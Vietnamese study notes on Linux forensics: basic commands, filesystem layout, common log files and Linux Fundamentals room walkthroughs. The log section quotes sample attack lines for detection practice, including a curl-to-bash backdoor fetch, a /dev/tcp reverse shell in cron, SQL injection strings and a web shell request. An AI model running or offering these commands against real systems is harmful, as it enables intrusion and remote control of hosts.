# Task 3: Linux Forensics
# Chức năng một số lệnh trong Linux
## ls

![image](https://hackmd.io/_uploads/BkK_dFEU-g.png)

Lệnh `ls`  viết tắt của list dùng để xem danh sách file và directory trong một vị trí cụ thể.
Ví dụ:

![image](https://hackmd.io/_uploads/SkWIHKVL-l.png)

## cd 
Lệnh `cd` viết tắt của change directory cho phép thay đổi thư mục hiện tại.
Ví dụ: ảnh ở trên thì ta đang đứng ở thư mục /home/thanhtung1709 h muốn chuyển sang thư mục Downloads thì ta dùng cd Downloads  

![image](https://hackmd.io/_uploads/HJCdDtNI-g.png)

## ps 

![image](https://hackmd.io/_uploads/ryms_YELbe.png)

Lệnh `ps` trong Linux là viết tắt của process status dùng để hiển thị thông tin về các tiến trình (process) đang chạy trên hệ thống.
Ví dụ: `ps aux` dùng để xem tiến trình của mọi người dùng, kèm thông tin chi tiết

![image](https://hackmd.io/_uploads/SJDSOY4IZl.png)

## xxd
Lệnh `xxd` dùng để hiển thị nội dung của file dưới dạng hex dump, hiển thị từng byte của file dưới dạng mã thập lục(hex) kèm theo phần ASCII tương ứng 
Ví dụ: 

![image](https://hackmd.io/_uploads/By_vKYEIZg.png)

## strings

![image](https://hackmd.io/_uploads/S18w5KVLZx.png)

Lệnh `strings` dùng để trích xuất tất cả các chuỗi ký tự có thể đọc được từ một file 
Lệnh strings trong Linux dùng để trích xuất các chuỗi ký tự có thể in được (ASCII hoặc Unicode) từ tệp nhị phân, thư viện, hoặc tệp dữ liệu khác.
Các tham số thường dùng:

`-a hoặc --all`: Quét toàn bộ tệp (bao gồm cả phần không được coi là dữ liệu văn bản).


`-n <số> hoặc --bytes=<số>`: Chỉ hiển thị chuỗi có độ dài tối thiểu <số> ký tự (mặc định là 4).


`-t <radix>`: Hiển thị vị trí (offset) của chuỗi trong tệp. (radix) có thể là o (bát phân), d (thập phân), x (hex).


`-e (encoding)`: Chỉ định bảng mã ký tự: s (7-bit ASCII), S (8-bit), l (UTF-16 little endian), b (UTF-16 big endian), L (32-bit little endian), B (32-bit big endian).


`-f`: Hiển thị tên tệp trước mỗi chuỗi 

`-o`: Hiển thị offset ở dạng bát phân (tương tự -t o).

Ví dụ:

![image](https://hackmd.io/_uploads/SyAH9tNL-g.png)

## grep 

![image](https://hackmd.io/_uploads/rycksFNL-l.png)

Lệnh `grep` dùng để để tìm kiếm chuỗi văn bản trong file hoặc đầu ra của lệnh khác 
Ví dụ: Các từ in màu đỏ là các từ tìm được 

![image](https://hackmd.io/_uploads/SkV2oKEIWl.png)

## cat

![image](https://hackmd.io/_uploads/H1xt2tV8Zx.png)

Lệnh `cat` trong Linux là viết tắt của concatenate dùng để hiển thị nội dung của file.
Ví dụ: 

![image](https://hackmd.io/_uploads/SkgOhF4Ubl.png)

## find

![image](https://hackmd.io/_uploads/rJvHatVLWg.png)

Lệnh `find` dùng để tìm kiếm file và thư mục trong hệ thống dựa trên nhiều tiêu chí như tên, kích thước, thời gian chỉnh sửa, quyền truy cập...
Ví dụ: Tìm các file có kích thước lớn hơn 10MB

![image](https://hackmd.io/_uploads/Sym6TYEI-l.png)

## file

![image](https://hackmd.io/_uploads/S1mtCKELZg.png)

lệnh `file` dùng để xem một file là loại gì, chỉ bằng cách nhìn vào nội dung bên trong chứ không chỉ dựa vào phần mở rộng. 
Ví dụ: 

![image](https://hackmd.io/_uploads/HJviRtN8We.png)

## mv

![image](https://hackmd.io/_uploads/ByXoe9EIWx.png)
Lệnh `mv` trong Linux là viết tắt của move dùng để di chuyển hoặc đổi tên file và thư mục.
Ví dụ: move file sang thư mục home

![image](https://hackmd.io/_uploads/SkrFGq4IZg.png)
![image](https://hackmd.io/_uploads/S1w5f5NLWe.png)

## rm 

![image](https://hackmd.io/_uploads/SylG7c4Ubg.png)

Lệnh `rm` trong Linux dùng để xóa file hoặc thư mục
Ví dụ:

![image](https://hackmd.io/_uploads/Hk57X5N8Wg.png)

xóa file này 

![image](https://hackmd.io/_uploads/Skc4Qq4U-x.png)

## echo 

![image](https://hackmd.io/_uploads/SyL2m5NLWx.png)

Lệnh `echo` trong Linux dùng để in ra chuỗi văn bản
Ví dụ: 

![image](https://hackmd.io/_uploads/BkvC7c48bl.png)

## pwd

![image](https://hackmd.io/_uploads/H1a_HqNUZg.png)

Lệnh `pwd` trong Linux là viết tắt của print working directory dùng để hiển thị đường dẫn thư mục hiện tại đang làm việc
Ví dụ: 

![image](https://hackmd.io/_uploads/B1e5r5NIbl.png)

# Tìm hiểu về Filesystem
## Cấu trúc

![image](https://hackmd.io/_uploads/H1wC28dIWx.png)

`/bin` : Thư mục chứa các tập tin nhị phân hệ thống thiết yếu cần thiết cho hoạt động cơ bản của hệ thống, chẳng hạn như ls, cp, mv và cat.

`/boot` : Thư mục /boot chứa các tập tin cần thiết boot loader tải hệ điều hành. Các tập tin này bao gồm kernel, đĩa RAM ban đầu và các tập tin cấu hình boot loader.

`/dev` (Các tập tin thiết bị): Thư mục chứa các tập tin thiết bị đại diện cho các thiết bị phần cứng và trình điều khiển. Các tập tin này có thể được sử dụng để tương tác trực tiếp với các thiết bị phần cứng, chẳng hạn như ổ USB, ổ CD-ROM và máy in.

`/etc` (Các tập tin cấu hình): Thư mục chứa các tập tin cấu hình cho hệ thống và các ứng dụng được cài đặt trên hệ thống. Các tập tin này bao gồm cấu hình mạng, tài khoản người dùng và cài đặt cấu hình toàn hệ thống.

`/home` (Thư mục chính của người dùng): Thư mục chứa các thư mục chính của từng người dùng trên hệ thống. Mỗi người dùng có một thư mục con trong thư mục /home chứa các tập tin và cài đặt cá nhân của họ.

`/lib` (Thư viện chia sẻ thiết yếu): Thư mục chứa các thư viện chia sẻ thiết yếu cần thiết cho các chương trình nhị phân hệ thống và các ứng dụng khác trên hệ thống.

`/media` (Phương tiện lưu trữ di động): Thư mục /media được sử dụng để mount các phương tiện lưu trữ di động, chẳng hạn như ổ USB, CD-ROM và DVD.

`/mnt` : Thư mục /mnt được sử dụng để mount các filesystem khác, chẳng hạn như network file systems hoặc các ổ cứng khác.

`/opt` (Phần mềm tùy chọn): Thư mục /opt được sử dụng cho phần mềm tùy chọn được cài đặt trên hệ thống. Thư mục này có thể được sử dụng để cài đặt phần mềm không có trong trình quản lý gói của hệ thống.

`/proc` (Thông tin tiến trình): Thư mục /proc chứa các tệp ảo cung cấp thông tin về hệ thống và các tiến trình đang chạy. Các tệp này có thể được sử dụng để giám sát hiệu suất hệ thống và chẩn đoán sự cố.

`/root` (Thư mục chính cho người dùng root): Thư mục /root là thư mục chính của người dùng root, quản trị viên hệ thống. Thư mục này chứa các tệp cá nhân và cài đặt cho người dùng root.

`/run` (Dữ liệu thời gian chạy): Thư mục /run chứa dữ liệu thời gian chạy cho hệ thống và các ứng dụng, chẳng hạn như log hệ thống, ID tiến trình và các tệp tạm thời khác.

`/sbin` (Tệp nhị phân hệ thống): Thư mục /sbin chứa các tệp nhị phân hệ thống cần thiết cho các tác vụ quản trị hệ thống, chẳng hạn như fdisk và iptables.

`/srv` (Dữ liệu dịch vụ): Thư mục /srv chứa dữ liệu cho các dịch vụ do hệ thống cung cấp, chẳng hạn như trang web và máy chủ FTP.

`/tmp` (Tệp tạm thời): Thư mục /tmp được sử dụng để lưu trữ các tệp tạm thời được tạo và sử dụng bởi các ứng dụng.

`/usr` (Tệp nhị phân và thư viện người dùng): Thư mục /usr chứa các tệp nhị phân và thư viện người dùng cho hệ thống, chẳng hạn như các công cụ quản trị hệ thống và thư viện phát triển.

`/var` (Dữ liệu biến): Thư mục /var chứa dữ liệu biến cho hệ thống, chẳng hạn như log hệ thống, mailboxes và tệp spool.
## File types 
Trong Linux có ba loại tệp chính: regular files, directories, and special files.
- Regular files: Đây là loại tệp phổ biến nhất, chứa dữ liệu như văn bản, hình ảnh và các tệp nhị phân chương trình.
- Directories: là các vùng chứa lưu trữ và sắp xếp các tệp và thư mục khác
- Special files: Các tệp này đại diện cho các thiết bị, chẳng hạn như ổ cứng, thiết bị đầu cuối hoặc network interface, và tạo điều kiện giao tiếp giữa kernel và thiết bị.
## File permissions 
Quyền của file được chia thành 3 loại: 
- Read ( r ): Cho phép người dùng xem nội dung của một tập tin hoặc thư mục.
- Write (w): Cấp cho người dùng quyền sửa đổi hoặc xóa một tập tin hoặc thư mục.
- Execute (x): Cho phép người dùng chạy một tập tin như một chương trình hoặc truy cập nội dung của thư mục.
# Tìm hiểu về log linux
## Các loại logs 
- System Logs: Đây là các tệp log chứa thông báo kernel, log khởi động và hoạt động chung của hệ thống
- Application Logs: Logs này được tạo bởi các ứng dụng cụ thể và thường được tìm thấy trong một thư mục con của vị trí log chính (/var/log).
- Service Logs: Đây là các logs được tạo bởi các dịch vụ hệ thống, daemon và các tiến trình nền và cũng được lưu trữ trong các thư mục con của vị trí chính (/var/log).
- User Logs: Các logs này liên quan đến hoạt động của người dùng, chẳng hạn như bản ghi đăng nhập/đăng xuất và lịch sử lệnh, và cũng được lưu trữ trong các thư mục con của vị trí chính(/var/log).
## Các log phổ biến
### syslog 
- Syslog lưu trữ các thông báo và thông tin chung về hệ thống. Tệp này lưu giữ tất cả hoạt động trên toàn hệ thống, điều đó có nghĩa là nó có thể khá dày đặc và khó đọc. Syslog cũng lưu trữ tất cả các sự kiện liên quan đến cron các tác vụ tự động diễn ra trong nền.

**Ví dụ**:
`Jan 30 14:02:11 kali-linux sshd[21450]: Accepted password for root from 192.168.1.15 port 54321 ssh2`
`Jan 30 14:02:11 kali-linux sshd[21450]: pam_unix(sshd:session): session opened for user root by (uid=0)`
Người dùng root đã đăng nhập thành công từ IP 192.168.1.15

`Jan 30 14:05:01 kali-linux sshd[21455]: Failed password for invalid user admin from 103.20.x.x port 44210 ssh2`
`Jan 30 14:05:03 kali-linux sshd[21457]: Failed password for invalid user admin from 103.20.x.x port 44210 ssh2`
`Jan 30 14:05:05 kali-linux sshd[21459]: Failed password for root from 103.20.x.x port 44210 ssh2`
Một IP đang cố gắng thử nhiều mật khẩu cho các tài khoản admin và root trong thời gian ngắn. Dấu hiệu của brute-force 

`Jan 30 15:10:22 ubuntu-server sudo:    user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/usr/bin/apt update`
Dùng quyền root để chạy lệnh 

`Jan 30 15:15:00 ubuntu-server sudo:    user1 : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash`
User1 đang đứng tại thư mục /tmp (nơi thường chứa malware do quyền ghi lỏng lẻo) và cố gắng mở một shell mới (/bin/bash) dưới quyền root. User1 đang cố gắng lấy shell root tương tác. Có thể là attacker đang cố gắng administrator privillege.

`Jan 30 03:00:01 db-server CRON[31200]: (root) CMD (curl -s http://malicious-site.com/backdoor.sh | bash)`
Root thực thi một lệnh tải script từ một website lạ và chạy trực tiếp bằng bash vào lúc 3 giờ sáng
### boot.log 
- Tệp boot.log lưu trữ các thông báo khởi động và thông tin khởi động. Boot.log giúp khắc phục sự cố liên quan đến quá trình khởi động hệ điều hành

**Ví dụ**: 
`[  OK  ] Started Recovery mode menu.`
`[  OK  ] Reached target System Time`
`[  OK  ] Mounted /boot/efi.`
`[  OK  ] Started Docker Application Container Engine.`
`[  OK  ] Started OpenBSD Secure Shell server.`
Các dịch vụ thiết yếu (SSH, Docker, Mount ổ đĩa) đều khởi động thành công.

`[  OK  ] Started Network Manager.`
`[FAILED] Failed to start Apache HTTP Server.`
`See 'systemctl status apache2.service' for details.`
`[  OK  ] Started MySql Community Server.`
Apache (web server) không thể khởi động ([FAILED]). Nguyên nhân: Lỗi cú pháp trong file config, hoặc cổng 80/443 đang bị chiếm dụng bởi một tiến trình khác (có thể là một malware đang nghe lén trên port này).

### faillog 
- faillog ghi lại tất cả các lần đăng nhập không thành công. Điểm hạn chế duy nhất của tệp nhật ký này là không thể xem được bằng các lệnh thông thường (như cat hoặc less). Thay vào đó, sử dụng lệnh `faillog` như `faillog -a`

**Ví dụ**: 

![image](https://hackmd.io/_uploads/S1kkT79LZl.png)

User developer có 2 lần đăng nhập sai (Failures: 2)


![image](https://hackmd.io/_uploads/SkaWp79Lbe.png)

Số lần thất bại lên tới hàng nghìn. attacker từ IP 103.45.xx.xx đang dùng tool tự động để dò mật khẩu hai tài khoản này liên tục. `Maximum=0` hệ thống chưa cấu hình giới hạn số lần thử


![image](https://hackmd.io/_uploads/SJX5p7qLWl.png)

Số lần thất bại (6) đã vượt quá giới hạn cho phép (5). Tài khoản finance_user hiện đang bị khóa, dù nhập đúng mật khẩu cũng không vào được.
### auth.log/secure
- Các tệp auth.log và secure ghi lại tất cả các lần xác thực (thành công hoặc thất bại) trên hệ thống. Trong các tệp logs này, có thể sẽ tìm thấy rất nhiều mục nhập cho người dùng root; đó là vì auth.log và secure cũng theo dõi các lần đăng nhập hệ thống, chẳng hạn như đăng nhập vào các tiến trình nền (daemon) và các tác vụ định kỳ (cron job), cũng như các tác vụ được chạy bằng sudo

`Jan 30 10:15:01 server sshd[1234]: Accepted publickey for ubuntu from 192.168.1.5 port 5566 ssh2`
`Jan 30 10:15:01 server sshd[1234]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)` 
User ubuntu đăng nhập bằng Key từ IP nội bộ

`Jan 30 23:40:11 server sshd[4421]: Invalid user minecraft from 203.11.xx.xx`
`Jan 30 23:40:11 server sshd[4421]: Failed password for invalid user minecraft from 203.11.xx.xx port 38290 ssh2`
attacker đoán tên tài khoản, thử login user minecraft nhưng user này không tồn tại trên hệ thống.

`Feb 02 06:25:01 server CRON[14500]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))`
Root chạy anacron để thực hiện các việc hàng ngày (logrotate, update database...). Đây là hành vi mặc định của Linux.
`Feb 02 06:30:01 server CRON[14550]: (www-data) CMD (php /var/www/html/cron.php)` 
User www-data chạy file cron.php. Đây thường là script dọn dẹp cache hoặc gửi mail của website (WordPress/Moodle). 

`Feb 02 03:00:01 server CRON[22100]: (www-data) CMD (bash -i >& /dev/tcp/192.168.56.101/4444 0>&1)` 
Reverse Shell. Web server đã bị hack (RCE) và hacker đã cài một cronjob để cứ 3 giờ sáng lại (connect back) tới máy của hacker tại cổng 4444. 

`Feb 02 10:15:22 server crontab[2300]: (root) BEGIN EDIT (root)`
`Feb 02 10:15:45 server crontab[2300]: (root) REPLACE (root)`
`Feb 02 10:15:45 server crontab[2300]: (root) END EDIT (root)` 
User root đã mở bảng cron ra sửa (BEGIN EDIT) và lưu đè nội dung mới (REPLACE).

`Feb 02 14:00:05 server systemd[1]: Started MySQL Community Server.`
`Feb 02 14:00:07 server mysqld[4001]: [ERROR] InnoDB: Unable to lock ./ibdata1 error: 11`
`Feb 02 14:00:07 server systemd[1]: mysql.service: Main process exited, code=exited, status=1/FAILURE`
`Feb 02 14:00:07 server systemd[1]: mysql.service: Failed with result 'exit-code'.`
MySQL khởi động (Started) nhưng ngắt ngay sau 2 giây (Main process exited).Unable to lock ./ibdata1. Lỗi này thường do ổ cứng đầy, hoặc một tiến trình MySQL khác bị treo (zombie process) đang giữ file dữ liệu này. 

`Feb 02 01:22:33 server systemd[1]: Started Network Configuration Update.`
`Feb 02 01:22:33 server net-update[8822]: Starting mining process... stratum+tcp://xmr.pool.com:443`

Daemon này kết nối đến xmr.pool.com (Một bể đào coin Monero). Máy chủ đã bị nhiễm Cryptominer (phần mềm đào tiền ảo trái phép) được ngụy trang dưới dạng một systemd service
### apt history 
- Nếu cần xem lịch sử của trình quản lý gói apt, có thể tìm thấy nó trong `/var/log/apt/history.log`. Tệp này lưu giữ nhật ký của mọi hành động xảy ra với lệnh apt (chẳng hạn như cài đặt, cập nhật, gỡ bỏ, v.v.). Các mục này sẽ liệt kê những ứng dụng nào đã được cài đặt, cập nhật hoặc gỡ bỏ, ai đã sử dụng lệnh và thời điểm lệnh được sử dụng.

**Ví dụ:** 
`Start-Date: 2026-01-30  03:15:22`
`Commandline: apt-get install nmap netcat-openbsd masscan`
`Requested-By: www-data (33)`
`Install: nmap:amd64 (7.80+dfsg1-2), netcat-openbsd:amd64 (1.206-1ubuntu1), masscan:amd64 (1.0.5-1)`
`End-Date: 2026-01-30  03:15:45`
Cài đặt nmap (quét mạng), netcat (kết nối backdoor), masscan (quét cổng tốc độ cao).
### access.log(apache2)
- access.log (thường nằm tại /var/log/apache2/access.log hoặc /var/log/httpd/access_log) ghi lại mọi yêu cầu gửi đến Web Server.

Mã phản hồi (Status Code) :
200: Hack thành công (hoặc server trả về trang lỗi custom 200).
301/302: Chuyển hướng.
401/403: Bị chặn (Permission denied).
404: Scan mù (Không tìm thấy file).
500: Payload của hacker làm crash code server.

`103.45.xx.xx - - [30/Jan/2026:11:05:01 +0700] "GET /admin/login.php HTTP/1.1" 404 456 "-" "Mozilla/5.0"`
`103.45.xx.xx - - [30/Jan/2026:11:05:02 +0700] "GET /wp-admin/ HTTP/1.1" 404 456 "-" "Mozilla/5.0"`
`103.45.xx.xx - - [30/Jan/2026:11:05:03 +0700] "GET /.env HTTP/1.1" 404 456 "-" "Mozilla/5.0"`
Cùng một IP yêu cầu liên tục các đường dẫn nhạy cảm (/admin, .env) trong thời gian cực ngắn (1 giây/lần).404 (Not Found) Hacker chưa tìm thấy gì.Mục tiêu tìm file .env (chứa mật khẩu DB) hoặc trang quản trị WordPress

`14.162.xx.xx - - [30/Jan/2026:14:10:00 +0700] "GET /product.php?id=1' OR '1'='1 HTTP/1.1" 200 8500 "-" "curl/7.68.0"`
`14.162.xx.xx - - [30/Jan/2026:14:10:05 +0700] "GET /login.php?user=admin' UNION SELECT 1,database(),3-- HTTP/1.1" 200 4500 "-" "sqlmap/1.4"`
Hacker đang cố gắng thao túng câu lệnh SQL để dump dữ liệu database hoặc bypass đăng nhập.

`88.12.xx.xx - - [30/Jan/2026:17:00:00 +0700] "POST /upload.php HTTP/1.1" 200 500 "-" "Mozilla/5.0"`
Hacker POST (upload) một file lên server.
`88.12.xx.xx - - [30/Jan/2026:17:00:05 +0700] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 120 "-" "Mozilla/5.0"`
Hacker truy cập file shell.php vừa upload kèm tham số ?cmd=id. Server đã bị kiểm soát hoàn toàn (RCE).
**Demo:**
Đầu tiên vì em tắt web server nên em sẽ bật nó lên 

![image](https://hackmd.io/_uploads/Bkv9g5p8-x.png)

em thử dùng lệnh curl để tải về gì đó trên web google.com 

![image](https://hackmd.io/_uploads/H15hbcTLbl.png)

Sau đó em vào access.log thì em thấy nó ghi 404 có nghĩa  là không tìm thấy file, server 0 phản hồi lại

![image](https://hackmd.io/_uploads/BJgyf5p8Zg.png)

1 ví dụ nữa là: 

em sẽ tạo 1 thư mục trong localhost

![image](https://hackmd.io/_uploads/SyfB3qTL-l.png)

Sau đó em sẽ tạo 1 file 

![image](https://hackmd.io/_uploads/rklXv2q6LZx.png)

Tiếp theo em dùng curl để truy cập vào file đó

![image](https://hackmd.io/_uploads/HJxy69pU-l.png)\

Sau đó em vào access.log thì em thấy nó get với mã phản hồi là 200 nên get thành công

![image](https://hackmd.io/_uploads/S1gKZT9TU-g.png)

### error.log(apache2)
- error.log là file ghi lại toàn bộ lỗi mà web server Apache gặp phải trong quá trình hoạt động.Lỗi cấu hình (config sai,
- thiếu module…), Lỗi truy cập tài nguyên (file không tồn tại, permission denied…),Lỗi PHP hoặc ứng dụng web (nếu PHP gửi lỗi về Apache),...

**Ví dụ:**
`[Fri Jan 30 20:00:00 2026] [mpm_prefork:error] [pid 1122] AH00161: server reached MaxRequestWorkers setting, consider raising the MaxRequestWorkers setting`
Server đã hết sạch process để xử lý request mới. Các request tiếp theo sẽ bị từ chối hoặc chờ đợi mãi mãi.

`[Fri Jan 30 10:15:22 2026] [core:error] [pid 12345] [client 192.168.1.50:54321] AH00128: File does not exist: /var/www/html/admin.php`
`[Fri Jan 30 10:15:23 2026] [core:error] [pid 12345] [client 192.168.1.50:54321] AH00128: File does not exist: /var/www/html/backup.zip`
Client 192.168.1.50 đang yêu cầu các file không tồn tại.

`[Fri Jan 30 14:00:00 2026] [php7:error] [pid 2341] [client 103.45.xx.xx] PHP Fatal error:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR '1'='1'' at line 1 in /var/www/html/login.php:25`
 Hacker đã chèn ký tự ' vào ô đăng nhập, làm hỏng câu lệnh SQL.
 
`[Fri Jan 30 15:30:00 2026] [cgi:error] [pid 4511] [client 203.11.xx.xx] AH01215: sh: 1: wget: not found: /var/www/html/upload.php`
Một script đã cố gắng chạy lệnh shell wget (để tải malware về) nhưng server không có cài wget
### dpkg.log 
- file log của hệ thống quản lý gói dpkg trên các distro họ Debian/Ubuntu. Đây là nơi ghi lại toàn bộ hoạt động liên quan đến cài đặt, gỡ bỏ, nâng cấp và cấu hình phần mềm.

Ví dụ: 
`2025-01-30 10:15:42 install nginx:amd64 <none> 1.18.0-6ubuntu14`
`2025-01-30 10:16:01 upgrade openssl:amd64 1.1.1f-1ubuntu2 1.1.1f-1ubuntu3`
`2025-01-30 10:17:20 remove apache2:amd64 2.4.41-4ubuntu3`

### kern.log 
- File này chứa: thông báo khởi động kernel, lỗi driver (USB, disk, network…), lỗi phần cứng (bad sector, overheating, memory error…), sự kiện liên quan đến module kernel (load/unload), Cảnh báo bảo mật từ kernel, Lỗi I/O, lỗi filesystem, Sự cố liên quan đến networking stack

Ví dụ: `kernel: module xyz loaded`
một module không thuộc hệ thống loaded có thể là malicious module 
# Linux Fundamentals 1 
## Task 1: Introduction
## Task 2: A Bit of Background on Linux
Task này chủ yếu giới thiệu về hệ điều hành Linux, nơi mà Linux được sử dụng
![image](https://hackmd.io/_uploads/Bkucb2V8-e.png)
## Task 3: Interacting With Your First Linux Machine (In-Browser)
Task này chỉ khởi động máy ảo
## Task 4: Running Your First few Commands
một ưu điểm lớn của việc sử dụng các hệ điều hành như Ubuntu là tính nhẹ nhàng, điều này cũng đi kèm với những nhược điểm, ví dụ như thường không có giao diện người dùng đồ họa (GUI). Phần lớn việc tương tác với các hệ thống này là sử dụng "Terminal".
task này cũng giới thiệu về lệnh echo

![image](https://hackmd.io/_uploads/Byrtz2EI-x.png)
![image](https://hackmd.io/_uploads/rkZcz24Lbg.png)
![image](https://hackmd.io/_uploads/SJvAfnNLWe.png)

Sử dụng lệnh whoami và thu được kết quả

![image](https://hackmd.io/_uploads/r1G6M2E8Zl.png)

## Task 5: Interacting With the Filesystem!
Task này giới thiệu về 4 lệnh là:

![image](https://hackmd.io/_uploads/S1ofmnNL-e.png)
![image](https://hackmd.io/_uploads/Sk4NmhELWg.png)
![image](https://hackmd.io/_uploads/BkfHXhEUWg.png)
![image](https://hackmd.io/_uploads/BkKUQ248be.png)

câu này thì cd vào từng thư mục 

![image](https://hackmd.io/_uploads/H1EYmn48Wl.png)
![image](https://hackmd.io/_uploads/H1fjm2ELWe.png)
![image](https://hackmd.io/_uploads/SyJ2m2ELWe.png)
![image](https://hackmd.io/_uploads/H12pQ3NL-l.png)

sử dụng lệnh pwd 

![image](https://hackmd.io/_uploads/Hke1NnEIWl.png)

## Task 6: Searching for Files
Task này giới thiệu về 2 lệnh tìm kiếm là `find` và `grep` ngoài ra còn có lệnh `wc` để đếm số từ cùa file 

![image](https://hackmd.io/_uploads/SkB9NnNI-x.png)
![image](https://hackmd.io/_uploads/SkAyrn4UWl.png)

## Task 7: An Introduction to Shell Operators
Task này giới thiệu về các toán tử:
`&` : cho phép chạy các lệnh trong nền của terminal có nghĩa là khi bt sử dụng 1 lệnh ngốn nhiều time thì ta có thể sử dụng lệnh này để chạy ngầm 1 lệnh khác
`&&` : cho phép  kết hợp nhiều lệnh với nhau trong một dòng của terminal
`>` : lấy đầu ra từ một lệnh mà chúng ta chạy và gửi đầu ra đó đến một nơi khác.
`>>` : thực hiện chức năng tương tự như toán tử > nhưng thêm đầu ra vào cuối thay vì thay thế (nghĩa là không có gì bị ghi đè).

![image](https://hackmd.io/_uploads/SkgBIhNL-g.png)
![image](https://hackmd.io/_uploads/HkCrLnN8-l.png)
![image](https://hackmd.io/_uploads/H1_I834Ubx.png)

# Linux Fundamentals 2
## Task 1: Introduction
## Task 2: Accessing Your Linux Machine Using SSH (Deploy)
Task này chủ yếu hướng dẫn cách sử dụng ssh để kết nối với Linux Machine của nó

![image](https://hackmd.io/_uploads/SJkfZJULbe.png)

## Task 3: Introduction to Flags and Switches
Task này giới thiệu về các flags đi theo mỗi lệnh 

![image](https://hackmd.io/_uploads/B1aP6RSLbg.png)

có thể sử dụng --help hoặc man để xem chi tiết các flags của lệnh đó 

![image](https://hackmd.io/_uploads/Hkzip0HLWx.png)
![image](https://hackmd.io/_uploads/SJixRCBI-e.png)
![image](https://hackmd.io/_uploads/Hyd1A0rIWx.png)

## Task 4: Filesystem Interaction Continued
Task này giới thiệu về các lệnh sau: 

![image](https://hackmd.io/_uploads/BJ3BRCSLZl.png)

lệnh `touch` sẽ tạo ra 1 file: 

![image](https://hackmd.io/_uploads/ryU_0Ar8Zx.png)

lệnh `mkdir` sẽ tạo ra 1 thư mục 

![image](https://hackmd.io/_uploads/B159A0H8We.png)

lệnh `rm` có thể xóa 1 file hoặc thư mục

![image](https://hackmd.io/_uploads/rkm60CHIZl.png)

lệnh `cp` sẽ copy nội dung file này cho 1 file khác 

![image](https://hackmd.io/_uploads/ByIxyyUU-x.png)

lệnh `mv` sẽ di chuyển hoặc đổi tên file/thư mục

![image](https://hackmd.io/_uploads/rkkBk1ILZl.png)

lệnh `file` sẽ xác định xem file đó là định dạng file nào

![image](https://hackmd.io/_uploads/SkRUJ1LUZe.png)
![image](https://hackmd.io/_uploads/SyHvWJLU-x.png)
![image](https://hackmd.io/_uploads/HJCPby88Ze.png)
![image](https://hackmd.io/_uploads/SJONW1IUbe.png)
![image](https://hackmd.io/_uploads/ryL_GkL8We.png)
![image](https://hackmd.io/_uploads/r1n0zJUU-g.png)
![image](https://hackmd.io/_uploads/HJqPG1LUZe.png)

## Task 5: Permissions 101
Task này nói về quyền truy cập của các file, lệnh `ls -l` sẽ cho ta biết được file đó thuộc quyền sở hữu của ai, và quyền thực thi của nó là gì 
Có các quyền sau: 

![image](https://hackmd.io/_uploads/S1IlNJI8Zx.png)

giá trị của các quyền đó là: 

![image](https://hackmd.io/_uploads/HJF-E1UUbl.png)

Ví dụ: 

![image](https://hackmd.io/_uploads/SkFm4JL8-g.png)
![image](https://hackmd.io/_uploads/HJoE4kU8We.png)
![image](https://hackmd.io/_uploads/rkTvN18UZe.png)
![image](https://hackmd.io/_uploads/HJ384yULbx.png)
![image](https://hackmd.io/_uploads/B15tEyLIWg.png)
![image](https://hackmd.io/_uploads/HJ7p418IZx.png)
![image](https://hackmd.io/_uploads/BknjEyII-e.png)

## Task 6: Common Directories
### /etc
Thư mục gốc này là một trong những thư mục gốc quan trọng nhất trên hệ thống. Thư mục etc (viết tắt của etcetera - các thư mục khác) là nơi phổ biến để lưu trữ các tệp hệ thống được hệ điều hành sử dụng.

![image](https://hackmd.io/_uploads/ryfMrkILZe.png)

### /var
Thư mục "/var", với "var" là viết tắt của dữ liệu biến đổi (variable data), là một trong những thư mục gốc chính được tìm thấy trên bản cài đặt Linux. Thư mục này lưu trữ dữ liệu được truy cập hoặc ghi thường xuyên bởi các dịch vụ hoặc ứng dụng đang chạy trên hệ thống. Ví dụ, các tệp log từ các dịch vụ và ứng dụng đang chạy được ghi ở  (/var/log)

![image](https://hackmd.io/_uploads/Bk258JILZe.png)

### /root
Không giống như thư mục /home, thư mục /root  là thư mục chính của người dùng hệ thống "root". Người dùng root sẽ lưu trữ dữ liệu của họ trong một thư mục như "/home/root" theo mặc định.

![image](https://hackmd.io/_uploads/B1GgDJUUWg.png)

### /tmp
Viết tắt của "temporary" (tạm thời), thư mục /tmp là thư mục không ổn định và được sử dụng để lưu trữ dữ liệu chỉ cần truy cập một hoặc hai lần. 

![image](https://hackmd.io/_uploads/HJTevkULWx.png)
![image](https://hackmd.io/_uploads/B1W4vkUUbg.png)

# Linux Fundamentals 3
## Task 1: Introduction
## Task 2: Deploy your linux machine
## Task 3: Terminal Text Editors
Task này giới thiệu về trình soạn thảo `nano` 

![image](https://hackmd.io/_uploads/SkDLT4u8-l.png)
![image](https://hackmd.io/_uploads/ryGRTEuUWe.png)
![image](https://hackmd.io/_uploads/HJzhp4OIZl.png)

## Task 4: General/Useful Utilities
Lệnh `wget` cho phép tải xuống các tập tin từ web thông qua HTTP
Lệnh `scp` là một phương pháp sao chép tập tin một cách an toàn. Không giống như lệnh `cp` thông thường, lệnh này cho phép chuyển tập tin giữa hai máy tính bằng giao thức SSH để cung cấp cả xác thực và mã hóa.
Hoạt động trên mô hình Source và Destination, SCP cho phép:
- Sao chép tập tin và thư mục từ hệ thống hiện tại sang hệ thống từ xa
- Sao chép tập tin và thư mục từ hệ thống từ xa sang hệ thống hiện tại
Với điều kiện biết tên người dùng và mật khẩu của người dùng trên hệ thống hiện tại và người dùng trên hệ thống từ xa
VD: 

![image](https://hackmd.io/_uploads/Bk7H1SO8-e.png)

Lệnh `python3 -m http.server` Mô-đun này biến máy tính thành một máy chủ web 

![image](https://hackmd.io/_uploads/r1jk4rO8Zl.png)
![image](https://hackmd.io/_uploads/SyjEXrd8-l.png)
![image](https://hackmd.io/_uploads/BJ0HQBuUWl.png)
![image](https://hackmd.io/_uploads/ryvaQHOIbl.png)

## Task 5: Processes 101 
Processes là các chương trình đang chạy trên máy tính.  
Chúng được quản lý bởi kernel, trong đó mỗi tiến trình sẽ có một ID được liên kết với nó còn được gọi là PID. PID tăng dần theo thứ tự mà Processes bắt đầu.
